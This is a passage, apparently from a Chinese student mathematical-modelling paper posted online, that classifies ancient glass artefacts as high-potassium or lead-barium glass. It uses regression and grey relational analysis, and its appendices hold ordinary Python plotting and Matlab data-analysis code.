P-P图</p><p>以上分析可知，所有的显著性都满足小于0.05的条件，故多元回归方程可行。在无风化条件下，如果以上化学成分不满足高钾玻璃的情况，那么将其归类为铅钡玻璃。在风化条件下，我们发现可以看高钾玻璃的成分情况与数据规律统计表对比，如果不符合高钾玻璃则为铅钡玻璃。</p><p>将表单3数据输入，首先将数据分类为风化和未风化。分析风化数据我们首先依据数据规律统计表，如果符合就符合个数加1，通过对符合高钾和铅钡玻璃的条件的个数进行判断该未知文物类型。最终判断结果如表5-17所示。</p><p>表5-17 玻璃文物分类表</p><table><thead><tr><th></th><th>高钾玻璃</th><th>铅钡玻璃</th></tr></thead><tbody><tr><td>A2</td><td>6</td><td>2</td></tr><tr><td>A5</td><td>1</td><td>6</td></tr><tr><td>A6</td><td>8</td><td>0</td></tr><tr><td>A7</td><td>7</td><td>0</td></tr></tbody></table><p>但A2表数据缺失较多，但是含有类型特征较强的氧化铝，氧化铅，五氧化二磷3种化学成分，形成新的比例：高钾玻璃：铅钡玻璃=1：2，所以A2更可能是铅钡玻璃。</p><p>分析未风化数据，我们首先利用回归方程进行计算得：</p><table><thead><tr><th></th><th>氧化钠</th><th>氧化钙</th><th>氧化铜</th><th>氧化钡</th></tr></thead><tbody><tr><td>A1</td><td>3.59044</td><td>-0.21597</td><td>-1.50003</td><td>10.39298</td></tr><tr><td>A3</td><td>-0.27902</td><td>3.28207</td><td>0.70326</td><td>5.22878</td></tr><tr><td>A6</td><td>1.08907</td><td>2.38099</td><td>1.59438</td><td>7.26728</td></tr><tr><td>A7</td><td>11.11155</td><td>0.61212</td><td>2.24646</td><td>29.14718</td></tr></tbody></table><p>综上，高钾玻璃分别是A1,A4,A6,A7,铅钡玻璃分别是A2,A3,A5,A8</p><h4 id="5-4问题四的求解与分析"><a href="#5-4问题四的求解与分析" class="headerlink" title="5.4问题四的求解与分析"></a>5.4问题四的求解与分析</h4><p>我们可以使用灰色关联分析的方式对比较不同类别之间的化学成分关联关系的差异性</p><h5 id="5-4-1-数据无量纲化处理"><a href="#5-4-1-数据无量纲化处理" class="headerlink" title="5.4.1 数据无量纲化处理"></a>5.4.1 数据无量纲化处理</h5><p>将题目给出表单2中，原始分类中的未经过风化的高钾玻璃与铅钡玻璃的数据分别导入SPSS，并通过Z-score标准化法对其中各项数据进行无量纲化。</p><p>Z-score标准化法公式如下：</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps165.jpg" alt="img"> </p><p>Z-score标准化法,首先计算该指标的均值<img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps166.jpg" alt="img">和标准差，然后用该变量的每一个观察值x减去均值x，再除以其标准差。</p><p>数据经过Z-score标准化后，将符合标准正态分布（0-1），即将有约一半观察值的数值小于0，另一半观察值的数值大于0，变量的均值为0，标准差为1，在本题的求解过程中，数据的标准化通过SPSS软件对数据分析获取[4]。</p><h5 id="5-4-2-灰色关联分析不同类别之间的化学成分关联关系"><a href="#5-4-2-灰色关联分析不同类别之间的化学成分关联关系" class="headerlink" title="5.4.2 灰色关联分析不同类别之间的化学成分关联关系"></a>5.4.2 灰色关联分析不同类别之间的化学成分关联关系</h5><p>将数据转置生成如下矩阵：</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps167.jpg" alt="img"> </p><p>其中参数m是变量类型，结合表单2可知，在当前数据集下m=14</p><p>关联程度实质是参考数列与比较数列曲线形状的相似程度。凡比较数列与参考数列的曲线形状接近，则两者间的关联度较大；反之，如果曲线形状相差较大，则两者间的关联度较小。因此，可用曲线间的差值大小作为关联度的衡量标准。</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps168.jpg" alt="img"> </p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps169.jpg" alt="img"> </p><p>其中ρ为分辨系数,用于降低Δ(max)过大而使关联系数出现较大误差，其取值范围(0,1)。当ρ越小，关联系数间差异越大，区分能力越强。在实现过程中ρ取值为0.5.</p><p>在本题的求解过程中，通过Matlab编程实现计算每个被评价对象指标序列，参考序列对应元素的绝对差值，并最终求出关联系数，并对其进行排序。（实现代码见附录）</p><h5 id="5-4-3-差异性分析"><a href="#5-4-3-差异性分析" class="headerlink" title="5.4.3 差异性分析"></a>5.4.3 差异性分析</h5><p>最后对关联度进行排序，得到相应类型下的关联度顺序。</p><p>其中高钾玻璃的关联度系数列表为：</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">Gld <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">23.0000</span> <span class="token number">19.0240</span> <span class="token number">18.1279</span> <span class="token number">18.2748</span> <span class="token number">19.2907</span> <span class="token number">20.5374</span> <span class="token number">19.9724</span> <span class="token number">18.3470</span> <span class="token number">18.1501</span> <span class="token number">17.0090</span> <span class="token number">16.9629</span> <span class="token number">18.5236</span> <span class="token number">20.0456</span> <span class="token number">21.3854</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应的关联度顺序为：1，7，13，3，11，5，2，4，12，8，10，9，6，14</p><p>不同的是铅钡玻璃的关联度系数列表为：</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">Gld <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">23.0000</span> <span class="token number">21.3854</span> <span class="token number">20.5374</span> <span class="token number">20.0456</span> <span class="token number">19.9724</span> <span class="token number">19.2907</span> <span class="token number">19.0240</span> <span class="token number">18.5236</span> <span class="token number">18.3470</span> <span class="token number">18.2748</span> <span class="token number">18.1501</span> <span class="token number">18.1279</span> <span class="token number">17.0090</span> <span class="token number">16.9629</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应的关联度顺序为：1，14，6，13，7，5，2，12，8, 4，9 ，3，10，11</p><p>比较二者关联度顺序，即可证明不同类别之间的化学成分关联具有显著差异性</p><h3 id="六、模型的评价与推广"><a href="#六、模型的评价与推广" class="headerlink" title="六、模型的评价与推广"></a>六、模型的评价与推广</h3><h4 id="6-1模型的优点"><a href="#6-1模型的优点" class="headerlink" title="6.1模型的优点"></a>6.1模型的优点</h4><p>在分析文物样品表面有无风化化学成分含量的统计规律时，将整个决策过程分为两部分，分别基于多元回归和最小二乘法进行拟合，保证了数据分析结果的可靠。</p><p>在实现系统聚类后，对于一些规律不很明显的组合适当进行人工干预重新组合，提炼出分类特征从而形成类标签，实现基于化学成分的亚类划分。</p><p>使用灰色关联分析方式能够很好的处理部分信息未知、部分信息已知的数据。</p><h4 id="6-2-模型的缺点"><a href="#6-2-模型的缺点" class="headerlink" title="6.2 模型的缺点"></a>6.2 模型的缺点</h4><p>进行亚类划分时，系统聚类完成后又加以统计学分析，对于一些规律不很明显的组合进行人工干预重新组合，虽然有利于划分，但在客观上也导致了模型主观性成分的提高。</p><h4 id="6-3-模型的优化"><a href="#6-3-模型的优化" class="headerlink" title="6.3 模型的优化"></a>6.3 模型的优化</h4><p>题目附件中数据量较少，随着建模过程的不断深入及划分亚类之后，每种亚类之间的数据量也过少，划分有较大误差。可以通过获取更大数据集对模型进行优化。</p><h3 id="七、参考文献"><a href="#七、参考文献" class="headerlink" title="七、参考文献"></a>七、参考文献</h3><p>[1] 李青会,干福熹 .关于中国古代玻璃研究的几个问题[J]. 自然科学史研究，2007年，26卷：234-247</p><p>[2] 段浩,干福熹,赵虹霞.实验室模拟过渡金属离子掺杂的中国古代玻璃的着色现象[J]. 硅酸盐学报 2009年12期</p><p>[3] 孙林,刘梦含,徐久成.基于优化初始聚类中心和轮廓系数的K-means聚类算法[J].模糊系统与数学,2022,36(01):47-65.</p><p>[4] 孙芳芳.浅议灰色关联度分析方法及其应用[J].科技信息, 2010</p><h3 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h3><p>附录说明：</p><ol><li><p>各类玻璃元素对比组成可视化python实现</p></li><li><p>高钾玻璃各组成成分的拟合曲线python实现代码</p></li><li><p>对高钾玻璃、铅钡玻璃进行亚分类的划分结果</p></li><li><p>灰色关联分析Matlab代码实现</p></li><li><p>表单2数据规律统计表</p></li></ol><h4 id="附录1-各类玻璃元素对比组成可视化python实现"><a href="#附录1-各类玻璃元素对比组成可视化python实现" class="headerlink" title="附录1  各类玻璃元素对比组成可视化python实现"></a>附录1  各类玻璃元素对比组成可视化python实现</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> matplotlib<span class="token comment">#字体设置为黑体</span>matplotlib<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.family'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'SimHei'</span>matplotlib<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'axes.unicode_minus'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>str1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"二氧化硅"</span><span class="token punctuation">,</span><span class="token string">"氧化钠"</span><span class="token punctuation">,</span><span class="token string">"氧化钾"</span><span class="token punctuation">,</span><span class="token string">"氧化钙"</span><span class="token punctuation">,</span><span class="token string">"氧化镁"</span><span class="token punctuation">,</span><span class="token string">"氧化铝"</span><span class="token punctuation">,</span><span class="token string">"氧化铁"</span><span class="token punctuation">,</span><span class="token string">"氧化铜"</span><span class="token punctuation">,</span><span class="token string">"氧化铅"</span><span class="token punctuation">,</span><span class="token string">"氧化钡"</span><span class="token punctuation">,</span><span class="token string">"五氧化二磷"</span><span class="token punctuation">,</span><span class="token string">"氧化锶"</span><span class="token punctuation">,</span><span class="token string">"氧化锡"</span><span class="token punctuation">,</span><span class="token string">"二氧化硫"</span><span class="token punctuation">)</span>y1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">68.71125</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9.031428571</span><span class="token punctuation">,</span><span class="token number">5.541428571</span><span class="token punctuation">,</span><span class="token number">1.462857143</span><span class="token punctuation">,</span><span class="token number">6.8525</span><span class="token punctuation">,</span><span class="token number">2.768571429</span><span class="token punctuation">,</span><span class="token number">2.895</span><span class="token punctuation">,</span><span class="token number">0.642</span><span class="token punctuation">,</span><span class="token number">1.795</span><span class="token punctuation">,</span><span class="token number">1.75</span><span class="token punctuation">,</span><span class="token number">0.0975</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0.406666667</span><span class="token punctuation">]</span>y2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">94.286</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0.84</span><span class="token punctuation">,</span><span class="token number">0.712</span><span class="token punctuation">,</span><span class="token number">0.54</span><span class="token punctuation">,</span><span class="token number">1.616</span><span class="token punctuation">,</span><span class="token number">0.248</span><span class="token punctuation">,</span><span class="token number">1.764</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0.3675</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>y3<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">62.095</span><span class="token punctuation">,</span><span class="token number">2.48</span><span class="token punctuation">,</span><span class="token number">13.525</span><span class="token punctuation">,</span><span class="token number">8.485</span><span class="token punctuation">,</span><span class="token number">0.52</span><span class="token punctuation">,</span><span class="token number">6.17</span><span class="token punctuation">,</span><span class="token number">1.65</span><span class="token punctuation">,</span><span class="token number">2.9</span><span class="token punctuation">,</span><span class="token number">0.11</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1.27</span><span class="token punctuation">,</span><span class="token number">0.04</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>y4<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">62.47</span><span class="token punctuation">,</span><span class="token number">3.38</span><span class="token punctuation">,</span><span class="token number">12.28</span><span class="token punctuation">,</span><span class="token number">8.23</span><span class="token punctuation">,</span><span class="token number">0.66</span><span class="token punctuation">,</span><span class="token number">9.23</span><span class="token punctuation">,</span><span class="token number">0.5</span><span class="token punctuation">,</span><span class="token number">0.47</span><span class="token punctuation">,</span><span class="token number">1.62</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0.16</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span>x<span class="token punctuation">,</span> str1<span class="token punctuation">,</span> rotation<span class="token operator">=</span><span class="token number">45</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y1<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y2<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y3<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y4<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="附录2-高钾玻璃各组成成分的拟合曲线python实现代码"><a href="#附录2-高钾玻璃各组成成分的拟合曲线python实现代码" class="headerlink" title="附录2 高钾玻璃各组成成分的拟合曲线python实现代码"></a>附录2 高钾玻璃各组成成分的拟合曲线python实现代码</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>linear_model <span class="token keyword">import</span> LinearRegressionplt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'SimHei'</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'axes.unicode_minus'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span><span class="token comment">#实例化线性模型****</span>lr <span class="token operator">=</span> LinearRegression<span class="token punctuation">(</span><span class="token punctuation">)</span>x<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">69.33</span><span class="token punctuation">,</span><span class="token number">87.05</span><span class="token punctuation">,</span><span class="token number">61.71</span><span class="token punctuation">,</span><span class="token number">65.88</span><span class="token punctuation">,</span><span class="token number">61.58</span><span class="token punctuation">,</span><span class="token number">67.65</span><span class="token punctuation">,</span><span class="token number">59.81</span><span class="token punctuation">,</span><span class="token number">92.63</span><span class="token punctuation">,</span><span class="token number">95.02</span><span class="token punctuation">,</span><span class="token number">96.77</span><span class="token punctuation">,</span><span class="token number">94.29</span><span class="token punctuation">,</span><span class="token number">92.35</span><span class="token punctuation">,</span><span class="token number">92.72</span><span class="token punctuation">,</span><span class="token number">59.01</span><span class="token punctuation">,</span><span class="token number">65.18</span><span class="token punctuation">,</span><span class="token number">62.47</span><span class="token punctuation">]</span>y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">9.99</span><span class="token punctuation">,</span><span class="token number">5.19</span><span class="token punctuation">,</span><span class="token number">12.37</span><span class="token punctuation">,</span><span class="token number">9.67</span><span class="token punctuation">,</span><span class="token number">10.95</span><span class="token punctuation">,</span><span class="token number">7.37</span><span class="token punctuation">,</span><span class="token number">7.68</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0.59</span><span class="token punctuation">,</span><span class="token number">0.92</span><span class="token punctuation">,</span><span class="token number">1.01</span><span class="token punctuation">,</span><span class="token number">0.74</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">12.53</span><span class="token punctuation">,</span><span class="token number">14.52</span><span class="token punctuation">,</span><span class="token number">12.28</span><span class="token punctuation">]</span>y2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">3.93</span><span class="token punctuation">,</span><span class="token number">4.06</span><span class="token punctuation">,</span><span class="token number">5.5</span><span class="token punctuation">,</span><span class="token number">6.44</span><span class="token punctuation">,</span><span class="token number">7.5</span><span class="token punctuation">,</span><span class="token number">11.15</span><span class="token punctuation">,</span><span class="token number">10.05</span><span class="token punctuation">,</span><span class="token number">1.98</span><span class="token punctuation">,</span><span class="token number">1.32</span><span class="token punctuation">,</span><span class="token number">0.81</span><span class="token punctuation">,</span><span class="token number">1.46</span><span class="token punctuation">,</span><span class="token number">3.5</span><span class="token punctuation">,</span><span class="token number">2.51</span><span class="token punctuation">,</span><span class="token number">6.16</span><span class="token punctuation">,</span><span class="token number">6.18</span><span class="token punctuation">,</span><span class="token number">9.23</span><span class="token punctuation">]</span>y3<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">3.87</span><span class="token punctuation">,</span><span class="token number">0.78</span><span class="token punctuation">,</span><span class="token number">5.09</span><span class="token punctuation">,</span><span class="token number">2.18</span><span class="token punctuation">,</span><span class="token number">3.27</span><span class="token punctuation">,</span><span class="token number">2.51</span><span class="token punctuation">,</span><span class="token number">2.18</span><span class="token punctuation">,</span><span class="token number">1.56</span><span class="token punctuation">,</span><span class="token number">1.55</span><span class="token punctuation">,</span><span class="token number">0.84</span><span class="token punctuation">,</span><span class="token number">1.65</span><span class="token punctuation">,</span><span class="token number">0.55</span><span class="token punctuation">,</span><span class="token number">1.54</span><span class="token punctuation">,</span><span class="token number">4.73</span><span class="token punctuation">,</span><span class="token number">1.07</span><span class="token punctuation">,</span><span class="token number">0.47</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'二氧化铜含量'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'氧化铜含量'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'二氧化硅与氧化铜含量散点拟合曲线'</span><span class="token punctuation">)</span>mymodel <span class="token operator">=</span> numpy<span class="token punctuation">.</span>poly1d<span class="token punctuation">(</span>numpy<span class="token punctuation">.</span>polyfit<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y2<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>myline <span class="token operator">=</span> numpy<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span> plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y2<span class="token punctuation">)</span> <span class="token comment"># 原始散点图</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>myline<span class="token punctuation">,</span> mymodel<span class="token punctuation">(</span>myline<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 多项式回归</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>numpy<span class="token punctuation">.</span>polyfit<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y2<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="附录3-对高钾玻璃、铅钡玻璃进行亚分类的划分结果"><a href="#附录3-对高钾玻璃、铅钡玻璃进行亚分类的划分结果" class="headerlink" title="附录3 对高钾玻璃、铅钡玻璃进行亚分类的划分结果"></a>附录3 对高钾玻璃、铅钡玻璃进行亚分类的划分结果</h4><p>高钾玻璃</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps170.jpg" alt="img"> </p><p>铅钡玻璃</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml20536\wps171.jpg" alt="img"> </p><h4 id="附录4-灰色关联分析Matlab实现代码"><a href="#附录4-灰色关联分析Matlab实现代码" class="headerlink" title="附录4 灰色关联分析Matlab实现代码"></a>附录4 灰色关联分析Matlab实现代码</h4><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">x1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0.97731</span> <span class="token number">1.29178</span> <span class="token number">0.74085</span> <span class="token number">0.1866</span> <span class="token operator">-</span><span class="token number">0.60495</span> <span class="token operator">-</span><span class="token number">0.45975</span> <span class="token operator">-</span><span class="token number">0.96173</span> <span class="token operator">-</span><span class="token number">0.19092</span> <span class="token number">2.43346</span> <span class="token number">0.39734</span> <span class="token operator">-</span><span class="token number">0.49958</span> <span class="token number">0.05052</span> <span class="token operator">-</span><span class="token number">0.21996</span> <span class="token number">0.14428</span> <span class="token operator">-</span><span class="token number">0.1428</span> <span class="token operator">-</span><span class="token number">0.57176</span> <span class="token number">0.42721</span> <span class="token number">0.11773</span> <span class="token operator">-</span><span class="token number">1.71013</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.37264</span> <span class="token number">3.74896</span> <span class="token number">2.18943</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token number">1.11262</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token number">1.89238</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span> <span class="token operator">-</span><span class="token number">0.37264</span><span class="token punctuation">;</span><span class="token number">0.26337</span> <span class="token operator">-</span><span class="token number">0.0789</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token number">0.85457</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token number">0.48118</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token number">0.48118</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token operator">-</span><span class="token number">0.51452</span> <span class="token number">0.54342</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">1.01049</span> <span class="token operator">-</span><span class="token number">1.2482</span> <span class="token operator">-</span><span class="token number">1.06847</span> <span class="token operator">-</span><span class="token number">0.81916</span> <span class="token operator">-</span><span class="token number">0.37852</span> <span class="token number">1.41303</span> <span class="token number">1.57537</span> <span class="token number">2.24792</span> <span class="token number">0.17228</span> <span class="token number">1.19271</span> <span class="token number">0.3868</span> <span class="token number">0.61292</span> <span class="token number">1.51159</span> <span class="token operator">-</span><span class="token number">0.1466</span> <span class="token number">0.3868</span> <span class="token operator">-</span><span class="token number">1.46272</span> <span class="token operator">-</span><span class="token number">0.76118</span> <span class="token operator">-</span><span class="token number">0.7032</span> <span class="token number">0.56074</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.86124</span> <span class="token operator">-</span><span class="token number">0.86124</span> <span class="token operator">-</span><span class="token number">0.86124</span> <span class="token operator">-</span><span class="token number">0.86124</span> <span class="token operator">-</span><span class="token number">0.86124</span> <span class="token number">3.03422</span> <span class="token number">0.40871</span> <span class="token number">0.49432</span> <span class="token number">1.3362</span> <span class="token number">1.23631</span> <span class="token operator">-</span><span class="token number">0.19059</span> <span class="token number">0.83678</span> <span class="token number">1.20778</span> <span class="token operator">-</span><span class="token number">0.07644</span> <span class="token number">0.9652</span> <span class="token number">0.72263</span> <span class="token operator">-</span><span class="token number">0.86124</span> <span class="token operator">-</span><span class="token number">0.86124</span> <span class="token number">0.26602</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.53585</span> <span class="token operator">-</span><span class="token number">0.54356</span> <span class="token operator">-</span><span class="token number">0.16943</span> <span class="token operator">-</span><span class="token number">0.96783</span> <span class="token operator">-</span><span class="token number">0.98711</span> <span class="token number">0.1237</span> <span class="token operator">-</span><span class="token number">0.29286</span> <span class="token number">0.15456</span> <span class="token number">4.10411</span> <span class="token number">0.91438</span> <span class="token operator">-</span><span class="token number">0.43942</span> <span class="token number">0.86424</span> <span class="token operator">-</span><span class="token number">0.19257</span> <span class="token operator">-</span><span class="token number">0.71327</span> <span class="token number">0.43997</span> <span class="token number">0.24712</span> <span class="token operator">-</span><span class="token number">0.44714</span> <span class="token operator">-</span><span class="token number">0.31985</span> <span class="token number">0.19698</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.18267</span> <span class="token operator">-</span><span class="token number">0.38351</span> <span class="token operator">-</span><span class="token number">0.42368</span> <span class="token operator">-</span><span class="token number">0.81198</span> <span class="token operator">-</span><span class="token number">0.55758</span> <span class="token number">1.58475</span> <span class="token number">0.20563</span> <span class="token number">1.04917</span> <span class="token number">0.92866</span> <span class="token number">2.85676</span> <span class="token operator">-</span><span class="token number">0.37013</span> <span class="token number">0.78138</span> <span class="token operator">-</span><span class="token number">0.24962</span> <span class="token operator">-</span><span class="token number">0.50402</span> <span class="token operator">-</span><span class="token number">0.81198</span> <span class="token operator">-</span><span class="token number">0.81198</span> <span class="token operator">-</span><span class="token number">0.81198</span> <span class="token operator">-</span><span class="token number">0.81198</span> <span class="token number">0.33952</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.21803</span> <span class="token operator">-</span><span class="token number">0.63577</span> <span class="token operator">-</span><span class="token number">0.6106</span> <span class="token operator">-</span><span class="token number">0.53511</span> <span class="token operator">-</span><span class="token number">0.97801</span> <span class="token operator">-</span><span class="token number">0.88238</span> <span class="token number">1.71462</span> <span class="token operator">-</span><span class="token number">0.21803</span> <span class="token operator">-</span><span class="token number">0.97801</span> <span class="token operator">-</span><span class="token number">0.6257</span> <span class="token operator">-</span><span class="token number">0.40929</span> <span class="token operator">-</span><span class="token number">0.2885</span> <span class="token operator">-</span><span class="token number">0.60054</span> <span class="token operator">-</span><span class="token number">0.6257</span> <span class="token operator">-</span><span class="token number">0.56027</span> <span class="token operator">-</span><span class="token number">0.30359</span> <span class="token operator">-</span><span class="token number">0.58041</span> <span class="token operator">-</span><span class="token number">0.39419</span> <span class="token number">0.5973</span><span class="token punctuation">;</span><span class="token number">0.54957</span> <span class="token number">0.22954</span> <span class="token number">0.72837</span> <span class="token number">1.50511</span> <span class="token operator">-</span><span class="token number">1.99899</span> <span class="token number">0.39214</span> <span class="token number">1.41118</span> <span class="token number">0.43296</span> <span class="token operator">-</span><span class="token number">1.44834</span> <span class="token operator">-</span><span class="token number">0.2518</span> <span class="token number">0.38437</span> <span class="token operator">-</span><span class="token number">2.19139</span> <span class="token number">0.85988</span> <span class="token number">0.60593</span> <span class="token number">1.12678</span> <span class="token number">1.32113</span> <span class="token number">0.20622</span> <span class="token number">0.45563</span> <span class="token number">0.08313</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">1.00644</span> <span class="token operator">-</span><span class="token number">0.92412</span> <span class="token operator">-</span><span class="token number">0.13464</span> <span class="token operator">-</span><span class="token number">0.38953</span> <span class="token operator">-</span><span class="token number">0.4421</span> <span class="token operator">-</span><span class="token number">0.13761</span> <span class="token operator">-</span><span class="token number">0.38259</span> <span class="token operator">-</span><span class="token number">0.78229</span> <span class="token operator">-</span><span class="token number">0.38061</span> <span class="token operator">-</span><span class="token number">0.50061</span> <span class="token number">0.30275</span> <span class="token operator">-</span><span class="token number">0.21894</span> <span class="token operator">-</span><span class="token number">1.10562</span> <span class="token operator">-</span><span class="token number">0.2487</span> <span class="token 